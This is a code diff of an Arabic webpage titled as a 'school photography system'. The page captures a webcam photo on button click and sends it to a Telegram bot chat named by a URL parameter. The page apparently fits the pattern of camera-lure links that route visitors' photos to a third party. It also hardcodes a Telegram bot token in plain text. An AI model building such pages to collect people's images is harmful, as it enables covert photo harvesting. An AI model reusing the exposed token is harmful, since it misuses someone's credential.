@@ -3,83 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع التصوير السريع</title>
+    <title>موقع التصوير المدرسي</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
-        video, canvas { width: 100%; max-width: 400px; border-radius: 10px; margin-top: 10px; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; background: #0088cc; color: white; margin: 10px; }
-        #status { margin-top: 15px; color: #555; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; color: #333; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        video, canvas { width: 100%; border-radius: 10px; background: #000; margin-bottom: 15px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; background: #0088cc; color: white; transition: 0.3s; width: 100%; }
+        button:hover { background: #006699; }
+        #status { margin-top: 15px; font-weight: bold; font-size: 14px; }
+        .error { color: #d9534f; }
+        .success { color: #5cb85c; }
     </style>
 </head>
 <body>
 
-    <h2>مرحباً بك في موقع التصوير</h2>
-    <p>اضغط على الزر لالتقاط صورة وإرسالها</p>
+    <div class="container">
+        <h2>📷 نظام التصوير المدرسي</h2>
+        <p>يرجى السماح للكاميرا بالعمل ثم اضغط إرسال</p>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    
-    <br>
-    <button id="capture">التقاط وإرسال الصورة</button>
-    <div id="status"></div>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        
+        <button id="capture">التقاط وإرسال الصورة الآن</button>
+        <div id="status"></div>
+    </div>
 
     <script>
+        // --- الإعدادات الأساسية ---
         const botToken = '8757176986:AAFNsvSswM4J_I_adIelUJWTSuqwRvFJgRo';
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        // الحصول على chat_id من الرابط (مثال: ?id=12345)
+        // الحصول على معرف المستخدم من الرابط (index.html?id=xxxx)
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        // تشغيل الكاميرا تلقائياً
+        // 1. طلب صلاحية الكاميرا وتشغيلها
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { video.srcObject = stream; })
+            .then(stream => { 
+                video.srcObject = stream; 
+            })
             .catch(err => { 
-                status.innerText = "خطأ: يجب السماح بالوصول للكاميرا";
-                console.error(err);
+                status.innerHTML = '<span class="error">خطأ: يجب السماح للكاميرا بالعمل لتتمكن من استخدام الموقع.</span>';
+                console.error("Camera Error:", err);
             });
 
+        // 2. معالجة الضغط على الزر
         document.getElementById('capture').addEventListener('click', () => {
             if (!chatId) {
-                status.innerText = "خطأ: لم يتم العثور على معرف المستخدم (ID) في الرابط";
+                status.innerHTML = '<span class="error">خطأ: لم يتم التعرف على المستخدم. يرجى فتح الرابط من البوت.</span>';
                 return;
             }
 
-            status.innerText = "جاري الإرسال...";
+            status.innerText = "⏳ جاري المعالجة وإرسال الصورة...";
 
-            // رسم الصورة من الفيديو إلى الـ Canvas
+            // التقاط فريم من الفيديو ورسمه على الكانفاس
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة إلى Blob لإرسالها
+            // تحويل الرسم إلى ملف صورة (Blob)
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', 'تم التقاط هذه الصورة من الموقع');
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', '✅ تم استلام صورة جديدة من الموقع.');
 
-                // إرسال الصورة إلى تلجرام
-                fetch(`https://telegram.org{botToken}/sendPhoto`, {
+                // 3. الإرسال إلى API تلجرام (الرابط الصحيح والمؤكد)
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        status.innerText = "تم إرسال الصورة بنجاح!";
+                        status.innerHTML = '<span class="success">✅ تم إرسال الصورة بنجاح إلى البوت!</span>';
                     } else {
-                        status.innerText = "فشل الإرسال: " + data.description;
+                        status.innerHTML = `<span class="error">❌ فشل الإرسال: ${data.description}</span>`;
                     }
                 })
                 .catch(err => {
-                    status.innerText = "حدث خطأ في الاتصال";
-                    console.error(err);
+                    status.innerHTML = '<span class="error">❌ حدث خطأ في الشبكة، تأكد من اتصالك بالإنترنت.</span>';
+                    console.error("Fetch Error:", err);
                 });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8); // جودة الصورة 80% لسرعة الإرسال
         });
     </script>
 </body>
